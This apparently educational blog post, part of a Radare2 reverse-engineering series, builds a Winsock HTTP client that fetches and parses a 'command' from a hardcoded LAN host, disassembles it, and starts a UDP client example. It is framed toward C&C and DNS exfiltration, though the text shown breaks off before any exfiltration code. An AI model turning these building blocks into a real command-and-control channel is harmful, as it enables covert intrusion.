---
layout: post
title:  "Reverse engineering x64 binaries with Radare2 - 17 (winsock, udp C&C and file exfiltration through DNS)"
tags: eversing c radare
image: '/images//radare2/radare2_17.png'
date: 2020-06-10 15:01:35 -0700
---

Buckle up kids cause this post is going to be _LONG_. 


#### About Winsock

_In computing, the Windows Sockets API (WSA), later shortened to Winsock, is a technical specification that defines how Windows network software should access network services, especially TCP/IP. It defines a standard interface between a Windows TCP/IP client application (such as an FTP client or a web browser) and the underlying TCP/IP protocol stack. The nomenclature is based on the Berkeley sockets API model used in BSD for communications between programs._

In this post, we'll be using radare2 and wireshark (install it by apt-get install wireshark or from its website)

#### Get requests with winsock
Remember about the get request we did with unix sockets, here's the equiv. with Winsock
```c 
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>

#pragma comment(lib, "ws2_32")

#define BUFLEN 65536
#define KSIZE 300
#define BSIZE 256


void getCommand(char buf[], char command[]){
    int i = 0;
    int kg = 0;
    int ki = 0;

    while(i < BSIZE && kg == 0){
        if(buf[i]== '<' && buf[i+1] == 'm' && buf[i+2] == '>' ){

            for(int j=i+3; j < KSIZE+i+2; j++){
                command[ki] = buf[j];
                ki = ki+1;
            }
            kg = 1;
        }
        i = i+1;
    }
}

int main()
{
    char request[] = "GET /sec.txt HTTP/1.1\r\nUser-Agent: nc/0.0.1\r\nHost: 127.0.0.1\r\nAccept: */*\r\n\r\n";
    char buff_rec[BUFLEN];
    char command[KSIZE];
    memset(&buff_rec,0,BUFLEN);
    SOCKET sock;
    WSADATA wsa;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr);
    int port = 80;
    int bytes_rec=0;
    int recv_size=0;

	WSAStartup(MAKEWORD(2,2),&wsa);
    sock = socket(AF_INET , SOCK_STREAM, IPPROTO_TCP);

    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");

    if (connect(sock, (struct sockaddr *) &ReceiverAddr , sizeof(ReceiverAddr)) < 0){
		printf("error \n");
		return 1;
	}

    if( send(sock , &request , strlen(request) , 0) < 0)
	{
		printf("send error\n");
		return 1;
	}

	if((recv_size = recv(sock , buff_rec , BUFLEN , 0)) == SOCKET_ERROR)
	{
		printf("recv error\n");
	}
	else{
        printf("size: %d \n",recv_size);
        printf("response: %s \n", buff_rec);
        printf("-----------------\n");
        getCommand(buff_rec, command);
        printf("command: %s \n", command);
	}
    return 0;
}
```

```
[0x004014e0]> s sym.main
[0x0040161e]> pdf
/ (fcn) sym.main 679
|   sym.main (int arg_170h, int arg_2a0h, int arg_102a0h, int arg_102a8h, int arg_102b0h, int arg_102b8h, int arg_102c0h, int arg_102c8h, int arg_102d0h, int arg_102d8h, int arg_102e0h, int arg_102e8h, int arg_102ech, int arg_102f8h, int arg_10300h, int arg_10304h, int arg_10308h, int arg_1030ch, int arg_80h);
|           ; var int local_40h @ rbp-0x40
|           ; arg int arg_80h @ rsp+0x80
|           ; CALL XREF from 0x004013c2 (sym.__tmainCRTStartup)
|           0x0040161e      55             push rbp
|           0x0040161f      b890030100     mov eax, 0x10390
|           0x00401624      e867170000     call fcn.00402d90
|           0x00401629      4829c4         sub rsp, rax
|           0x0040162c      488dac248000.  lea rbp, [arg_80h]          ; 0x80 ; 128
|           0x00401634      e887030000     call sym.__main
|           0x00401639      48b847455420.  movabs rax, 0x6365732f20544547
|           0x00401643      488985a00201.  mov qword [arg_102a0h], rax ; [0x102a0:8]=-1
|           0x0040164a      48b82e747874.  movabs rax, 0x545448207478742e
|           0x00401654      488985a80201.  mov qword [arg_102a8h], rax ; [0x102a8:8]=-1
|           0x0040165b      48b8502f312e.  movabs rax, 0x550a0d312e312f50
|           0x00401665      488985b00201.  mov qword [arg_102b0h], rax ; [0x102b0:8]=-1
|           0x0040166c      48b87365722d.  movabs rax, 0x6e6567412d726573
|           0x00401676      488985b80201.  mov qword [arg_102b8h], rax ; [0x102b8:8]=-1
|           0x0040167d      48b8743a206e.  movabs rax, 0x2e302f636e203a74
|           0x00401687      488985c00201.  mov qword [arg_102c0h], rax ; [0x102c0:8]=-1
|           0x0040168e      48b8302e310d.  movabs rax, 0x736f480a0d312e30
|           0x00401698      488985c80201.  mov qword [arg_102c8h], rax ; [0x102c8:8]=-1
|           0x0040169f      48b8743a2031.  movabs rax, 0x302e373231203a74
|           0x004016a9      488985d00201.  mov qword [arg_102d0h], rax ; [0x102d0:8]=-1
|           0x004016b0      48b82e302e31.  movabs rax, 0x63410a0d312e302e
|           0x004016ba      488985d80201.  mov qword [arg_102d8h], rax ; [0x102d8:8]=-1
|           0x004016c1      48b863657074.  movabs rax, 0x2f2a203a74706563
|           0x004016cb      488985e00201.  mov qword [arg_102e0h], rax ; [0x102e0:8]=-1
|           0x004016d2      c785e8020100.  mov dword [arg_102e8h], 0xd0a0d2a
|           0x004016dc      66c785ec0201.  mov word [arg_102ech], 0xa  ; [0x102ec:2]=0xffff
|           0x004016e5      488d85a00200.  lea rax, [arg_2a0h]         ; 0x2a0 ; 672
|           0x004016ec      41b800000100   mov r8d, 0x10000
|           0x004016f2      ba00000000     mov edx, 0
|           0x004016f7      4889c1         mov rcx, rax
|           0x004016fa      e801170000     call sym.memset             ; void *memset(void *s, int c, size_t n)
|           0x004016ff      c7850c030100.  mov dword [arg_1030ch], 0x10 ; 16
|           0x00401709      c78508030100.  mov dword [arg_10308h], 0x50 ; 'P' ; 80
|           0x00401713      c78504030100.  mov dword [arg_10304h], 0   ; [0x10304:4]=-1
|           0x0040171d      c78500030100.  mov dword [arg_10300h], 0   ; [0x10300:4]=-1
|           0x00401727      488d45d0       lea rax, [local_30h]
|           0x0040172b      4889c2         mov rdx, rax
|           0x0040172e      b902020000     mov ecx, 0x202              ; 514
|           0x00401733      488b05a67c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x4093e0:8]=0x9752 reloc.WS2_32.dll_WSAStartup ; "R\x97"
|           0x0040173a      ffd0           call rax
|           0x0040173c      41b806000000   mov r8d, 6
|           0x00401742      ba01000000     mov edx, 1
|           0x00401747      b902000000     mov ecx, 2
|           0x0040174c      488b05bd7c00.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x409410:8]=0x978e reloc.WS2_32.dll_socket
|           0x00401753      ffd0           call rax
|           0x00401755      488985f80201.  mov qword [arg_102f8h], rax ; [0x102f8:8]=-1
|           0x0040175c      66c745c00200   mov word [local_40h], 2
|           0x00401762      8b8508030100   mov eax, dword [arg_10308h] ; [0x10308:4]=-1
|           0x00401768      0fb7c0         movzx eax, ax
|           0x0040176b      89c1           mov ecx, eax
|           0x0040176d      488b057c7c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4093f0:8]=0x976a reloc.WS2_32.dll_htons ; "j\x97"
|           0x00401774      ffd0           call rax
|           0x00401776      668945c2       mov word [local_3eh], ax
|           0x0040177a      488d0d7f3800.  lea rcx, str.192.168.0.50   ; section..rdata ; 0x405000 ; "192.168.0.50"
|           0x00401781      488b05707c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4093f8:8]=0x9772 reloc.WS2_32.dll_inet_addr ; "r\x97"
|           0x00401788      ffd0           call rax
|           0x0040178a      8945c4         mov dword [local_3ch], eax
|           0x0040178d      488d45c0       lea rax, [local_40h]
|           0x00401791      488b8df80201.  mov rcx, qword [arg_102f8h] ; [0x102f8:8]=-1
|           0x00401798      41b810000000   mov r8d, 0x10               ; 16
|           0x0040179e      4889c2         mov rdx, rax
|           0x004017a1      488b05407c00.  mov rax, qword sym.imp.WS2_32.dll_connect ; [0x4093e8:8]=0x9760 reloc.WS2_32.dll_connect ; "`\x97"
|           0x004017a8      ffd0           call rax
|           0x004017aa      85c0           test eax, eax
|       ,=< 0x004017ac      7916           jns 0x4017c4
|       |   0x004017ae      488d0d583800.  lea rcx, str.error          ; 0x40500d ; "error "
|       |   0x004017b5      e836160000     call sym.puts               ; int puts(const char *s)
|       |   0x004017ba      b801000000     mov eax, 1
|      ,==< 0x004017bf      e9f8000000     jmp 0x4018bc
|      ||   ; CODE XREF from 0x004017ac (sym.main)
|      |`-> 0x004017c4      488d85a00201.  lea rax, [arg_102a0h]       ; 0x102a0
|      |    0x004017cb      4889c1         mov rcx, rax
|      |    0x004017ce      e80d160000     call sym.strlen             ; size_t strlen(const char *s)
|      |    0x004017d3      89c2           mov edx, eax
|      |    0x004017d5      488d85a00201.  lea rax, [arg_102a0h]       ; 0x102a0
|      |    0x004017dc      488b8df80201.  mov rcx, qword [arg_102f8h] ; [0x102f8:8]=-1
|      |    0x004017e3      41b900000000   mov r9d, 0
|      |    0x004017e9      4189d0         mov r8d, edx
|      |    0x004017ec      4889c2         mov rdx, rax
|      |    0x004017ef      488b05127c00.  mov rax, qword sym.imp.WS2_32.dll_send ; [0x409408:8]=0x9786 reloc.WS2_32.dll_send
|      |    0x004017f6      ffd0           call rax
|      |    0x004017f8      85c0           test eax, eax
|      |,=< 0x004017fa      7916           jns 0x401812
|      ||   0x004017fc      488d0d113800.  lea rcx, str.send_error     ; 0x405014 ; "send error"
|      ||   0x00401803      e8e8150000     call sym.puts               ; int puts(const char *s)
|      ||   0x00401808      b801000000     mov eax, 1
|     ,===< 0x0040180d      e9aa000000     jmp 0x4018bc
|     |||   ; CODE XREF from 0x004017fa (sym.main)
|     ||`-> 0x00401812      488d85a00200.  lea rax, [arg_2a0h]         ; 0x2a0 ; 672
|     ||    0x00401819      488b8df80201.  mov rcx, qword [arg_102f8h] ; [0x102f8:8]=-1
|     ||    0x00401820      41b900000000   mov r9d, 0
|     ||    0x00401826      41b800000100   mov r8d, 0x10000
|     ||    0x0040182c      4889c2         mov rdx, rax
|     ||    0x0040182f      488b05ca7b00.  mov rax, qword sym.imp.WS2_32.dll_recv ; [0x409400:8]=0x977e reloc.WS2_32.dll_recv ; "~\x97"
|     ||    0x00401836      ffd0           call rax
|     ||    0x00401838      898500030100   mov dword [arg_10300h], eax ; [0x10300:4]=-1
|     ||    0x0040183e      83bd00030100.  cmp dword [arg_10300h], 0xffffffffffffffff
|     ||,=< 0x00401845      750e           jne 0x401855
|     |||   0x00401847      488d0dd13700.  lea rcx, str.recv_error     ; 0x40501f ; "recv error"
|     |||   0x0040184e      e89d150000     call sym.puts               ; int puts(const char *s)
|    ,====< 0x00401853      eb62           jmp 0x4018b7
|    ||||   ; CODE XREF from 0x00401845 (sym.main)
|    |||`-> 0x00401855      8b8500030100   mov eax, dword [arg_10300h] ; [0x10300:4]=-1
|    |||    0x0040185b      89c2           mov edx, eax
|    |||    0x0040185d      488d0dc63700.  lea rcx, str.size:__d       ; 0x40502a ; "size: %d \n"
|    |||    0x00401864      e88f150000     call sym.printf             ; int printf(const char *format)
|    |||    0x00401869      488d85a00200.  lea rax, [arg_2a0h]         ; 0x2a0 ; 672
|    |||    0x00401870      4889c2         mov rdx, rax
|    |||    0x00401873      488d0dbb3700.  lea rcx, str.response:__s   ; 0x405035 ; "response: %s \n"
|    |||    0x0040187a      e879150000     call sym.printf             ; int printf(const char *format)
|    |||    0x0040187f      488d0dbe3700.  lea rcx, str.               ; 0x405044 ; "-----------------"
|    |||    0x00401886      e865150000     call sym.puts               ; int puts(const char *s)
|    |||    0x0040188b      488d95700100.  lea rdx, [arg_170h]         ; 0x170 ; 368
|    |||    0x00401892      488d85a00200.  lea rax, [arg_2a0h]         ; 0x2a0 ; 672
|    |||    0x00401899      4889c1         mov rcx, rax
|    |||    0x0040189c      e8affcffff     call sym.getCommand
|    |||    0x004018a1      488d85700100.  lea rax, [arg_170h]         ; 0x170 ; 368
|    |||    0x004018a8      4889c2         mov rdx, rax
|    |||    0x004018ab      488d0da43700.  lea rcx, str.command:__s    ; 0x405056 ; "command: %s \n"
|    |||    0x004018b2      e841150000     call sym.printf             ; int printf(const char *format)
|    |||    ; CODE XREF from 0x00401853 (sym.main)
|    `----> 0x004018b7      b800000000     mov eax, 0
|     ||    ; CODE XREF from 0x004017bf (sym.main)
|     ||    ; CODE XREF from 0x0040180d (sym.main)
|     ``--> 0x004018bc      4881c4900301.  add rsp, 0x10390
|           0x004018c3      5d             pop rbp
\           0x004018c4      c3             ret
[0x0040161e]>                                                              
```
So at first the program seems to be initializing some memory, like an array or something:

```
|           0x004016e5      488d85a00200.  lea rax, [arg_2a0h]         ; 0x2a0 ; 672
|           0x004016ec      41b800000100   mov r8d, 0x10000
            ;-- rip:
|           0x004016f2 b    ba00000000     mov edx, 0
|           0x004016f7      4889c1         mov rcx, rax
```
And that is what it is as we see here:
```
[0x004016f2]> afvd
arg arg_102a0h = 0x0061fdb0  0x6365732f20544547   GET /sec ascii
arg arg_102a8h = 0x0061fdb8  0x545448207478742e   .txt HTT ascii

[0x004016f2]> pxw @ 0x0061fdb0
0x0061fdb0  0x20544547 0x6365732f 0x7478742e 0x54544820  GET /sec.txt HTT
0x0061fdc0  0x2e312f50 0x550a0d31 0x2d726573 0x6e656741  P/1.1..User-Agen
0x0061fdd0  0x6e203a74 0x2e302f63 0x0d312e30 0x736f480a  t: nc/0.0.1..Hos
0x0061fde0  0x31203a74 0x302e3732 0x312e302e 0x63410a0d  t: 127.0.0.1..Ac
0x0061fdf0  0x74706563 0x2f2a203a 0x0d0a0d2a 0x0000000a  cept: */*.......
```
It basically initializes a char array containing the HTTP (GET) REQUEST to be done

This is useful, as now we basically know or at least can easily figure out what the program does. We also see /sec.txt here which is the path, so we can easily go there on the server ourselves and try to see what that file represents

Then memset and WSAStartup are called:

```
|           0x004016f7      4889c1         mov rcx, rax
|           0x004016fa      e801170000     call sym.memset             ; void *memset(void *s, int c, size_t n)
|           0x004016ff      c7850c030100.  mov dword [arg_1030ch], 0x10 ; r12
|           0x00401709      c78508030100.  mov dword [arg_10308h], 0x50 ; 'P' ; 80
|           0x00401713      c78504030100.  mov dword [arg_10304h], 0   ; [0x10304:4]=0
|           0x0040171d      c78500030100.  mov dword [arg_10300h], 0   ; [0x10300:4]=0
|           0x00401727      488d45d0       lea rax, [local_30h]
|           0x0040172b      4889c2         mov rdx, rax
|           0x0040172e      b902020000     mov ecx, 0x202              ; 514
|           0x00401733      488b05a67c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x4093e0:8]=0x7ffcc178da50 ; "P\xdax\xc1\xfc\x7f"
|           0x0040173a      ffd0           call rax
```
So, memset here as we see is zeroing a buffer, that will probably be used for sending/receiving stuff (the get request) to-from the server.

Then WSAStartup basically sets the environment up for WINSOCK to be used, we cannot create a Socket without previously calling WSAStartup.

Then the socket is created:

```
|           0x0040173c      41b806000000   mov r8d, 6
|           0x00401742      ba01000000     mov edx, 1
|           0x00401747      b902000000     mov ecx, 2
|           0x0040174c      488b05bd7c00.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x409410:8]=0x7ffcc1786230 ; "0bx\xc1\xfc\x7f"
|           0x00401753      ffd0           call rax
```
Params are 6,1,2 and from what we already know we should see those mean that our socket will be a tcp inet socket and thus the connection will be in "stream" mode.


Then another interesting call appears: htons
```
|           0x0040176b      89c1           mov ecx, eax
            ;-- rip:
|           0x0040176d b    488b057c7c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4093f0:8]=0x7ffcc1793aa0
|           0x00401774      ffd0           call rax

[0x0040176d]> dr ecx
0x00000050
```
From this one, we should be able to detect that the remote port is 80,(0x50 = 80dec), so now we know about the port and the get request, what remains is the server address 

And tbh that is mega easy, cause in here we find it hardcoded:

```
|           0x0040177a      488d0d7f3800.  lea rcx, str.192.168.0.50   ; section..rdata ; 0x405000 ; "192.168.0.50"
|           0x00401781      488b05707c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4093f8:8]=0x7ffcc1794190
|           0x00401788      ffd0           call rax
```
inet_addr() call gets the network byte order address from a char array. Now we know anything about the program, as we see connect is then called with those params and send as well.

```
|      |    0x004017d5      488d85a00201.  lea rax, [arg_102a0h]       ; 0x102a0
|      |    0x004017dc      488b8df80201.  mov rcx, qword [arg_102f8h] ; [0x102f8:8]=0x100000001
|      |    0x004017e3      41b900000000   mov r9d, 0
|      |    0x004017e9      4189d0         mov r8d, edx
|      |    0x004017ec      4889c2         mov rdx, rax
|      |    0x004017ef      488b05127c00.  mov rax, qword sym.imp.WS2_32.dll_send ; [0x409408:8]=0x7ffcc1791210
|      |    0x004017f6      ffd0           call rax
```
And as we see the GET request we saw is what gets sent 

Next thing here is, what about the response? What do we get from the server? Let's inspect RECV 
```
|     ||`-> 0x00401812      488d85a00200.  lea rax, [arg_2a0h]         ; 0x2a0 ; 672
|     ||    0x00401819      488b8df80201.  mov rcx, qword [arg_102f8h] ; [0x102f8:8]=0x100000001
|     ||    0x00401820      41b900000000   mov r9d, 0
|     ||    0x00401826      41b800000100   mov r8d, 0x10000
|     ||    0x0040182c      4889c2         mov rdx, rax
|     ||    0x0040182f      488b05ca7b00.  mov rax, qword sym.imp.WS2_32.dll_recv ; [0x409400:8]=0x7ffcc17917b0
|     ||    0x00401836      ffd0           call rax
```
And if we debug that we'll see it: 

```
[0x0040182f]> pxw @ 0x0060fdb0
0x0060fdb0  0x50545448 0x312e312f 0x30303220 0x0d4b4f20  HTTP/1.1 200 OK.
0x0060fdc0  0x7461440a 0x54203a65 0x202c7568 0x4a203131  .Date: Thu, 11 J
0x0060fdd0  0x32206e75 0x20303230 0x313a3031 0x34353a30  un 2020 10:10:54
0x0060fde0  0x544d4720 0x65530a0d 0x72657672 0x7041203a   GMT..Server: Ap
0x0060fdf0  0x65686361 0x342e322f 0x2038312e 0x75625528  ache/2.4.18 (Ubu
0x0060fe00  0x2975746e 0x614c0a0d 0x4d2d7473 0x6669646f  ntu)..Last-Modif
0x0060fe10  0x3a646569 0x64655720 0x3031202c 0x6e754a20  ied: Wed, 10 Jun
0x0060fe20  0x32303220 0x31312030 0x3a36313a 0x47203232   2020 11:16:22 G
0x0060fe30  0x0a0d544d 0x67615445 0x3122203a 0x61352d62  MT..ETag: "1b-5a
0x0060fe40  0x66386237 0x65333539 0x22306134 0x63410a0d  7b8f953e4a0"..Ac
0x0060fe50  0x74706563 0x6e61522d 0x3a736567 0x74796220  cept-Ranges: byt
0x0060fe60  0x0a0d7365 0x746e6f43 0x2d746e65 0x676e654c  es..Content-Leng
0x0060fe70  0x203a6874 0x0a0d3732 0x746e6f43 0x2d746e65  th: 27..Content-
0x0060fe80  0x65707954 0x6574203a 0x702f7478 0x6e69616c  Type: text/plain
0x0060fe90  0x0a0d0a0d 0x6d3e6d3c 0x61737365 0x74206567  ....<m>message t
0x0060fea0  0x6562206f 0x6c656420 0x72657669 0x000a6465  o be delivered..
```
That's it.

If we have an open wireshark session on the server box we should see something like this: 

```
00000000  47 45 54 20 2f 73 65 63  2e 74 78 74 20 48 54 54   GET /sec .txt HTT
00000010  50 2f 31 2e 31 0d 0a 55  73 65 72 2d 41 67 65 6e   P/1.1..U ser-Agen
00000020  74 3a 20 6e 63 2f 30 2e  30 2e 31 0d 0a 48 6f 73   t: nc/0. 0.1..Hos
00000030  74 3a 20 31 32 37 2e 30  2e 30 2e 31 0d 0a 41 63   t: 127.0 .0.1..Ac
00000040  63 65 70 74 3a 20 2a 2f  2a 0d 0a 0d 0a            cept: */ *....
    00000000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d   HTTP/1.1  200 OK.
    00000010  0a 44 61 74 65 3a 20 54  68 75 2c 20 31 31 20 4a   .Date: T hu, 11 J
    00000020  75 6e 20 32 30 32 30 20  31 30 3a 31 30 3a 35 34   un 2020  10:10:54
    00000030  20 47 4d 54 0d 0a 53 65  72 76 65 72 3a 20 41 70    GMT..Se rver: Ap
    00000040  61 63 68 65 2f 32 2e 34  2e 31 38 20 28 55 62 75   ache/2.4 .18 (Ubu
    00000050  6e 74 75 29 0d 0a 4c 61  73 74 2d 4d 6f 64 69 66   ntu)..La st-Modif
    00000060  69 65 64 3a 20 57 65 64  2c 20 31 30 20 4a 75 6e   ied: Wed , 10 Jun
    00000070  20 32 30 32 30 20 31 31  3a 31 36 3a 32 32 20 47    2020 11 :16:22 G
    00000080  4d 54 0d 0a 45 54 61 67  3a 20 22 31 62 2d 35 61   MT..ETag : "1b-5a
    00000090  37 62 38 66 39 35 33 65  34 61 30 22 0d 0a 41 63   7b8f953e 4a0"..Ac
    000000A0  63 65 70 74 2d 52 61 6e  67 65 73 3a 20 62 79 74   cept-Ran ges: byt
    000000B0  65 73 0d 0a 43 6f 6e 74  65 6e 74 2d 4c 65 6e 67   es..Cont ent-Leng
    000000C0  74 68 3a 20 32 37 0d 0a  43 6f 6e 74 65 6e 74 2d   th: 27.. Content-
    000000D0  54 79 70 65 3a 20 74 65  78 74 2f 70 6c 61 69 6e   Type: te xt/plain
    000000E0  0d 0a 0d 0a                                        ....
    000000E4  3c 6d 3e 6d 65 73 73 61  67 65 20 74 6f 20 62 65   <m>messa ge to be
    000000F4  20 64 65 6c 69 76 65 72  65 64 0a                   deliver ed.
```
Next thing to know here is if the program does something with this response, and we see the getCommand func being called: 

```
|    |||    0x00401886      e865150000     call sym.puts               ; int puts(const char *s)
|    |||    0x0040188b      488d95700100.  lea rdx, [arg_170h]         ; 0x170 ; 368
|    |||    0x00401892      488d85a00200.  lea rax, [arg_2a0h]         ; 0x2a0 ; 672
|    |||    0x00401899      4889c1         mov rcx, rax
|    |||    0x0040189c      e8affcffff     call sym.getCommand
```

```
|       ,=< 0x00401575      e98a000000     jmp 0x401604
|       |   ; CODE XREF from 0x00401611 (sym.getCommand)
|      .--> 0x0040157a      8b45fc         mov eax, dword [local_4h]
|      :|   0x0040157d      4898           cdqe
|      :|   0x0040157f      488b5510       mov rdx, qword [arg_10h]    ; r12 ; [0x10:8]=-1
|      :|   0x00401583      4801d0         add rax, rdx                ; '('
|      :|   0x00401586      0fb600         movzx eax, byte [rax]
|      :|   0x00401589      3c3c           cmp al, 0x3c                ; '<' ; 60
|     ,===< 0x0040158b      7573           jne 0x401600
|     |:|   0x0040158d      8b45fc         mov eax, dword [local_4h]
|     |:|   0x00401590      4898           cdqe
|     |:|   0x00401592      488d5001       lea rdx, [rax + 1]          ; 1
|     |:|   0x00401596      488b4510       mov rax, qword [arg_10h]    ; r12 ; [0x10:8]=-1
|     |:|   0x0040159a      4801d0         add rax, rdx                ; '('
|     |:|   0x0040159d      0fb600         movzx eax, byte [rax]
|     |:|   0x004015a0      3c6d           cmp al, 0x6d                ; 'm' ; 109
|    ,====< 0x004015a2      755c           jne 0x401600
|    ||:|   0x004015a4      8b45fc         mov eax, dword [local_4h]
|    ||:|   0x004015a7      4898           cdqe
|    ||:|   0x004015a9      488d5002       lea rdx, [rax + 2]          ; rcx
|    ||:|   0x004015ad      488b4510       mov rax, qword [arg_10h]    ; r12 ; [0x10:8]=-1
|    ||:|   0x004015b1      4801d0         add rax, rdx                ; '('
|    ||:|   0x004015b4      0fb600         movzx eax, byte [rax]
|    ||:|   0x004015b7      3c3e           cmp al, 0x3e                ; '>' ; 62
|   ,=====< 0x004015b9      7545           jne 0x401600
|   |||:|   0x004015bb      8b45fc         mov eax, dword [local_4h]
|   |||:|   0x004015be      83c003         add eax, 3
|   |||:|   0x004015c1      8945f0         mov dword [local_10h], eax
|  ,======< 0x004015c4      eb26           jmp 0x4015ec
|  ||||:|   ; CODE XREF from 0x004015f7 (sym.getCommand)
| .-------> 0x004015c6      8b45f0         mov eax, dword [local_10h]
| :||||:|   0x004015c9      4898           cdqe
| :||||:|   0x004015cb      488b5510       mov rdx, qword [arg_10h]    ; r12 ; [0x10:8]=-1
| :||||:|   0x004015cf      4801d0         add rax, rdx                ; '('
| :||||:|   0x004015d2      8b55f4         mov edx, dword [local_ch]
| :||||:|   0x004015d5      4863d2         movsxd rdx, edx
| :||||:|   0x004015d8      488b4d18       mov rcx, qword [arg_18h]    ; [0x18:8]=-1 ; 24
| :||||:|   0x004015dc      4801ca         add rdx, rcx                ; '&'
| :||||:|   0x004015df      0fb600         movzx eax, byte [rax]
| :||||:|   0x004015e2      8802           mov byte [rdx], al
| :||||:|   0x004015e4      8345f401       add dword [local_ch], 1
| :||||:|   0x004015e8      8345f001       add dword [local_10h], 1
| :||||:|   ; CODE XREF from 0x004015c4 (sym.getCommand)
| :`------> 0x004015ec      8b45fc         mov eax, dword [local_4h]
| : |||:|   0x004015ef      052d010000     add eax, 0x12d
| : |||:|   0x004015f4      3945f0         cmp dword [local_10h], eax  ; [0x13:4]=-1 ; 19
| `=======< 0x004015f7      7ecd           jle 0x4015c6
|   |||:|   0x004015f9      c745f8010000.  mov dword [local_8h], 1
|   |||:|   ; CODE XREF from 0x0040158b (sym.getCommand)
|   |||:|   ; CODE XREF from 0x004015a2 (sym.getCommand)
|   |||:|   ; CODE XREF from 0x004015b9 (sym.getCommand)
|   ```---> 0x00401600      8345fc01       add dword [local_4h], 1
|      :|   ; CODE XREF from 0x00401575 (sym.getCommand)
|      :`-> 0x00401604      817dfcff0000.  cmp dword [local_4h], 0xff  ; rax ; [0xff:4]=-1
|      :,=< 0x0040160b      7f0a           jg 0x401617
|      :|   0x0040160d      837df800       cmp dword [local_8h], 0
|      `==< 0x00401611      0f8463ffffff   je 0x40157a
|       |   ; CODE XREF from 0x0040160b (sym.getCommand)
|       `-> 0x00401617      90             nop
```
And again, we are already familiar with this function, it just parses the message in a rudimentary way. As it looks liek the program is not doing anything with that we can consider that our work with this one is done.

#### Hello world UDP 

Until now we have only seen TCP sockets being used, UDP can be used as well in both Linux using sock and here in the Windows lands using Winsock. The main difference between TCP and UDP is that UDP will just send the data out without any kind of syncronization or integrity check, so the data may arrive at dest or not, it is commonly used in video streaming but also in other cool stuff like DNS.

One interesting thing regarding UDP packets is that as far as I've seen they don't call the interest of security researchers / blue teams as much as TCP and some take advantage of this, we'll see. 


So the following program is a classical example of a UDP packet being sent using Winsock. We can use netcat to receive it:

We'll start a netcat listener expecting UDP packets at port 5353 with this:

```
nc -lvup 5353
```
Anything received there will be printed

The code for the "client" is the following:
```c
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>

#pragma comment(lib, "ws2_32")

#define BUFLEN 65536

int main()
{
    char buffer[] = {'h','e','l','l','o'};

    SOCKET sock;
    WSADATA wsa;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr);
    int port = 5353;
    int bytes_rec=0;

	WSAStartup(MAKEWORD(2,2),&wsa);
    sock = socket(AF_INET , SOCK_DGRAM, IPPROTO_UDP);

    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");

    int r =sendto(sock, &buffer , sizeof(buffer) , 0, (struct SOCKADDR *) &ReceiverAddr, slen);
    printf("bytes sent: %d \n", r);

    memset(buffer,0,5);

    bytes_rec=recvfrom(sock, &buffer, sizeof(buffer), 0,0,0);

    printf("bytes rec: %d \n", bytes_rec);
    printf("response: %s", buffer);

    return 0;
}
```
Just note that the buffer we are sending can be declared they (weird) way I did or we can also use char *buffer = "hello". 

Also note that in here with UDP we use dgram (datagram) and we indicate udp as the protocol and we are not doing connect() here, we are just doing sendto. You should know why, as we don't have "sessions" in UDP, we just send the data out, expecting no confirmation.

When doing recv() we'll expect data from the server in return that may or may not come. 

Let's look at the disasm:

```
[0x00401550]> pdf
/ (fcn) sym.main 415
|   sym.main (int arg_17fh, int arg_180h, int arg_181h, int arg_182h, int arg_183h, int arg_184h, int arg_188h, int arg_194h, int arg_198h, int arg_19ch);
|           ; CALL XREF from 0x004013c2 (sym.__tmainCRTStartup)
|           0x00401550      55             push rbp
|           0x00401551      4881ec200200.  sub rsp, 0x220
|           0x00401558      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
|           0x00401560      e86b020000     call sym.__main
|           0x00401565      c6857f010000.  mov byte [arg_17fh], 0x68   ; 'h' ; 104
|           0x0040156c      c68580010000.  mov byte [arg_180h], 0x65   ; 'e' ; 101
|           0x00401573      c68581010000.  mov byte [arg_181h], 0x6c   ; 'l' ; 108
|           0x0040157a      c68582010000.  mov byte [arg_182h], 0x6c   ; 'l' ; 108
|           0x00401581      c68583010000.  mov byte [arg_183h], 0x6f   ; 'o' ; 111
|           0x00401588      c7859c010000.  mov dword [arg_19ch], 0x10  ; 16
|           0x00401592      c78598010000.  mov dword [arg_198h], 0x14e9
|           0x0040159c      c78594010000.  mov dword [arg_194h], 0     ; [0x194:4]=-1 ; 0
|           0x004015a6      488d45e0       lea rax, [local_20h]
|           0x004015aa      4889c2         mov rdx, rax
|           0x004015ad      b902020000     mov ecx, 0x202              ; 514
|           0x004015b2      488b050f6e00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x4083c8:8]=0x872a reloc.WS2_32.dll_WSAStartup ; "*\x87"
|           0x004015b9      ffd0           call rax
|           0x004015bb      41b811000000   mov r8d, 0x11               ; 17
|           0x004015c1      ba02000000     mov edx, 2
|           0x004015c6      b902000000     mov ecx, 2
|           0x004015cb      488b051e6e00.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x4083f0:8]=0x8762 reloc.WS2_32.dll_socket ; "b\x87"
|           0x004015d2      ffd0           call rax
|           0x004015d4      488985880100.  mov qword [arg_188h], rax   ; [0x188:8]=-1 ; 392
|           0x004015db      66c745d00200   mov word [local_30h], 2
|           0x004015e1      8b8598010000   mov eax, dword [arg_198h]   ; [0x198:4]=-1 ; 408
|           0x004015e7      0fb7c0         movzx eax, ax
|           0x004015ea      89c1           mov ecx, eax
